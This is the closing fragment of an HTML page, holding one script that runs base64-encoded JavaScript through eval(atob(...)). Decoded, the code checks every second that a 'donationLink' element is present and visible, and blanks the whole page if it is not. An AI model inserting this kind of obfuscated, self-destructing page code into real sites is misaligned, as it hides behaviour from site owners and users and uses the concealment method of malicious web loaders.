<script>eval(atob("c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXt2YXIgZT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZG9uYXRpb25MaW5rIik7aWYoIWUpcmV0dXJuIHZvaWQoZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiIpO3ZhciB0PXdpbmRvdy5nZXRDb21wdXRlZFN0eWxlKGUpO2lmKCJub25lIj09PXQuZGlzcGxheXx8ImhpZGRlbiI9PT10LnZpc2liaWxpdHl8fDA9PT1wYXJzZUZsb2F0KHQub3BhY2l0eSkpcmV0dXJuIHZvaWQoZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiIpO2Zvcih2YXIgbj1lLnBhcmVudEVsZW1lbnQ7biYmIkJPRFkiIT09bi50YWdOYW1lOyl7dmFyIG89d2luZG93LmdldENvbXB1dGVkU3R5bGUobik7aWYoIm5vbmUiPT09by5kaXNwbGF5fHwiaGlkZGVuIj09PW8udmlzaWJpbGl0eXx8MD09PXBhcnNlRmxvYXQoby5vcGFjaXR5KSlyZXR1cm4gdm9pZChkb2N1bWVudC5ib2R5LmlubmVySFRNTD0iIik7bj1uLnBhcmVudEVsZW1lbnR9fSwxMDAwKTs="));</script>
</body>
</html>
